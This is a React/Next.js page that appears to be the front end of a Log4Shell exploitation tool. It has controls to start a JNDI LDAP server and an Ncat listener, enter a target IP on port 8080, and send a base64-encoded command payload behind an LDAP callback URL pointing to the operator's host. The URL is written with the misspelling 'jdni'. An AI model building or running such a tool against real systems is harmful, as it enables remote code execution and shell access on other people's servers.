'use client'
import {
    Box,
    Button,
    Wrap,
    Text,
    Divider,
    Input,
    InputGroup,
    InputRightElement,
    InputRightAddon,
    InputLeftAddon,
    Spinner,
    useColorMode,
    ButtonGroup
} from "@chakra-ui/react";
import { useEffect, useRef, useState } from "react";
import "@fontsource/jetbrains-mono";
import { exportReport } from "@/app/components/exportpdf";
import {
    fetchJavaPath,
    fetchIP,
    startJNDI,
    startNcat,
    inputCMD,
    sendPayload,
    stopJNDI,
    stopNcat,
    checkJNDI,
    checkNcat,
} from "@/app/api/fetchdata";

const HomePage = () => {
    const { colorMode } = useColorMode();
    const [state, setState] = useState({
        javaPath: '',
        error: '',
        intIP: '',
        extIP: '',
        ipError: '',
        consolelog: '',
        targetIP: '',
        command: '',
        loading: false,
        payload: '',
        filename: ''
    });
    const consoleBoxRef = useRef<HTMLDivElement | null>(null);
    const ipRegex = /^(?:[0-9]{1,3}\.){3}(?!0|255)[0-9]{1,3}$/;

    useEffect(() => {
        setState((prevState) => ({ ...prevState, loading: true }));
        fetchJavaPath().then(({ javaPath, error }) => {
            if (javaPath) {
                setState((prevState) => ({ ...prevState, javaPath }));
                updateConsoleLog(`Java Path: ${javaPath}`);
            }
            if (error) {
                setState((prevState) => ({ ...prevState, error }));
            }
            fetchIP().then(({ intIP, extIP, ipError }) => {
                if (intIP) {
                    setState((prevState) => ({ ...prevState, intIP }));
                    updateConsoleLog(`Internal IP: ${intIP}`);
                }
                if (extIP) {
                    setState((prevState) => ({ ...prevState, extIP }));
                    updateConsoleLog(`External IP: ${extIP}`);
                }
                if (ipError) {
                    setState((prevState) => ({ ...prevState, ipError }));
                }
                setState((prevState) => ({ ...prevState, loading: false }));
            });
        });
    }, []);

    useEffect(() => {
        if (consoleBoxRef.current) {
            consoleBoxRef.current.scrollTop = consoleBoxRef.current.scrollHeight;
        }
    }, [state.consolelog]);

    const updateConsoleLog = (log: any) => {
        setState((prevState) => ({ ...prevState, consolelog: prevState.consolelog + (prevState.consolelog ? `\n${log}` : log) }));
    };

    const handleInputButtonClick = async (type: any, payload = null) => {
        setState((prevState) => ({ ...prevState, loading: true }));
        let newConsoleLog = '';
        switch (type) {
            case 'test':
                newConsoleLog += 'Test successful!';
                break;
            case 'inputCommand':
                const base64cmd = btoa(state.command);
                const inputCMDResult = await inputCMD(base64cmd);
                newConsoleLog += inputCMDResult.message || inputCMDResult.error;
                break;
            case 'settargetip':
                if (!ipRegex.test(state.targetIP)) {
                    newConsoleLog += 'Error: Invalid IP Address Format';
                } else {
                    newConsoleLog += `Target IP Address: ${state.targetIP}`;
                }
                break;
            case 'sendPayload':
                if (!ipRegex.test(state.targetIP)) {
                    newConsoleLog += 'Error: Invalid Target IP Address Format';
                } else if (!state.payload) {
                    newConsoleLog += 'Error: Payload is empty';
                } else {
                    const base64payload = btoa(state.payload);
                    const payloadResult = await sendPayload(base64payload, state.targetIP);
                    newConsoleLog += payloadResult.message ? `${payloadResult.message}` : payloadResult.error;
                }
                break;
            case 'startJNDI':
                const jndiResult = await startJNDI();
                newConsoleLog += jndiResult.error ? jndiResult.error : jndiResult.message;
                break;
            case 'stopJNDI':
                const stopJndiResult = await stopJNDI();
                newConsoleLog += stopJndiResult.error ? stopJndiResult.error : stopJndiResult.message;
                break;
            case 'checkJNDI':
                const checkJndiResult = await checkJNDI();
                newConsoleLog += checkJndiResult.error ? checkJndiResult.error : checkJndiResult.message;
                break;
            case 'startNcat':
                const ncatResult = await startNcat(state.filename);
                newConsoleLog += ncatResult.error ? ncatResult.error : ncatResult.message;
                break;
            case 'setNcatFilename':
                setState((prevState) => ({ ...prevState, filename: state.filename }));
                break;
            case 'stopNcat':
                const stopNcatResult = await stopNcat();
                newConsoleLog += stopNcatResult.error ? stopNcatResult.error : stopNcatResult.message;
                break;
            case 'checkNcat':
                const checkNcatResult = await checkNcat();
                newConsoleLog += checkNcatResult.error ? checkNcatResult.error : checkNcatResult.message;
                break;
            default:
                newConsoleLog += 'Unknown operation';
                break;
        }
        setState((prevState) => ({ ...prevState, loading: false, consolelog: prevState.consolelog + (prevState.consolelog ? `\n${newConsoleLog}` : newConsoleLog) }));
    };

    return (
        <Box>
            <Box>
                <Box border='lg' borderWidth='1px' borderRadius='lg' overflow='hidden' px={4} my={4}>
                    <Text fontSize='xl' fontWeight='bold' my={4} ml={1}>Host related</Text>
                    <InputGroup size='md' mt={4}>
                        <Input
                            pr='4.5rem'
                            placeholder='Command'
                            value={state.command}
                            onChange={(e) => setState((prevState) => ({ ...prevState, command: e.target.value }))}
                        />
                        <InputRightElement width='4rem'>
                            <Button size='sm' backgroundColor={'transparent'} _hover={{ backgroundColor: 'transparent' }} onClick={() => handleInputButtonClick('inputCommand')}>
                                Run
                            </Button>
                        </InputRightElement>
                    </InputGroup>
                    <InputGroup size='md' mt={4}>
                        <Input
                            pr='4.5rem'
                            placeholder='Filename'
                            value={state.filename}
                            onChange={(e) => setState((prevState) => ({ ...prevState, filename: e.target.value }))}
                        />
                        <InputRightElement width='4rem'>
                            <Button size='sm' backgroundColor={'transparent'} _hover={{ backgroundColor: 'transparent' }} onClick={() => handleInputButtonClick('setNcatFilename')}>
                                Set
                            </Button>
                        </InputRightElement>
                    </InputGroup>
                    <Button size='sm' backgroundColor={'transparent'} _hover={{ backgroundColor: 'transparent' }} onClick={() => setState((prevState) => ({ ...prevState, command: '', filename: '' }))}>Clear
                    </Button>
                </Box>
                <Box border='lg' borderWidth='1px' borderRadius='lg' overflow='hidden' px={4} my={4}>
                    <Text fontSize='xl' fontWeight='bold' my={4} ml={1}>Target related</Text>
                    <InputGroup size='md' mb={2}>
                        <Input
                            pr='4.5rem'
                            placeholder='Target IP Address'
                            value={state.targetIP}
                            onChange={(e) => setState((prevState) => ({ ...prevState, targetIP: e.target.value }))}
                        />
                        <InputRightAddon>:8080</InputRightAddon>
                    </InputGroup>
                    <InputGroup size='md'>
                        <InputLeftAddon>jdni:ldap://{state.intIP}:1389/Basic/Command/Base64/</InputLeftAddon>
                        <Input
                            pr='4.5rem'
                            placeholder='Payload'
                            value={state.payload}
                            onChange={(e) => setState((prevState) => ({ ...prevState, payload: e.target.value }))}
                        />
                    </InputGroup>
                    <ButtonGroup>
                        <Button size='sm' backgroundColor={'transparent'} _hover={{ backgroundColor: 'transparent' }} onClick={() => setState((prevState) => ({ ...prevState, payload: '', targetIP: '' }))} mb={1}>Clear</Button>
                    </ButtonGroup>
                </Box>
                <Box border='lg' borderWidth='1px' borderRadius='lg' overflow='hidden' px={4} my={4}>
                    <Text fontSize='xl' fontWeight='bold' mt={4} ml={1}>Actions</Text>
                    <Wrap spacing={2} my={2}>
                        {[
                            { label: 'Test', type: 'test' },
                            { label: 'Start JNDI Server', type: 'startJNDI' },
                            { label: 'Stop JNDI Server', type: 'stopJNDI' },
                            { label: 'Check JNDI Server', type: 'checkJNDI' },
                            { label: 'Start Ncat Server', type: 'startNcat' },
                            { label: 'Stop Ncat Server', type: 'stopNcat' },
                            { label: 'Check Ncat Server', type: 'checkNcat' },
                            { label: 'Send Payload', type: 'sendPayload' },
                        ].map(({ label, type }) => (
                            <Button key={type} size={'sm'} colorScheme={type === 'sendPayload' ? 'blue' : type === 'stopJNDI' || type === 'stopNcat' ? 'red' : type === 'startJNDI' || type === 'startNcat' ? 'green' : type === 'exportReport' ? 'purple' : type === 'checkJNDI' || type === 'checkNcat' ? 'cyan' : 'gray'} variant='outline' onClick={() => handleInputButtonClick(type)}>
                                {label}
                            </Button>
                        ))}
                    </Wrap>
                    <Wrap spacing={2} mb={4}>
                        {[
                            { label: 'Export Console Log', type: 'exportReport', onClick: () => exportReport(state.consolelog) },
                            { label: 'Clear All', type: 'clearAll', onClick: () => setState((prevState) => ({ ...prevState, consolelog: '' })) }
                        ].map(({ label, type, onClick }) => (
                            <Button key={type} size={'sm'} colorScheme={type === 'exportReport' ? 'purple' : 'gray'} variant='outline' onClick={onClick}>
                                {label}
                            </Button>
                        ))}
                    </Wrap>
                </Box>
            </Box>
            <Box ref={consoleBoxRef} as="footer" width="full" justifyContent="center" borderWidth='1px' borderRadius='lg' overflow='hidden' minW={"100%"} minH={"40vh"} maxH={"40vh"} overflowY={"auto"}>
                <Box position="sticky" top="0" zIndex="sticky" bg={colorMode === "light" ? "white" : "gray.800"} px={4} pt={4}>
                    <Text ml={1}>Output Console: {state.loading && (<Spinner size='xs' thickness='4px' speed='0.65s' emptyColor='gray.200' color='blue.500' />)}</Text>
                    <Divider my={2} />
                </Box>
                <Box ref={consoleBoxRef} px={4} pb={4}>
                    {state.consolelog.split('\n').map((line, index) => (
                        <Text key={index} fontFamily={'JetBrains Mono'} fontSize={'sm'} whiteSpace='pre-wrap'>
                            {line.split('\n').map((part, i) => (
                                <Text as="span" key={i} display="block"
                                    _before={{
                                        content: '"$ "',
                                        color: 'blue.500',
                                        display: 'inline',
                                        fontFamily: 'JetBrains Mono',
                                        fontWeight: 'bold',
                                        marginRight: '8px',
                                        fontSize: 'sm',
                                    }}
                                >{part}</Text>
                            ))}
                        </Text>
                    ))}
                </Box>
            </Box>
        </Box>
    );
};

export default HomePage;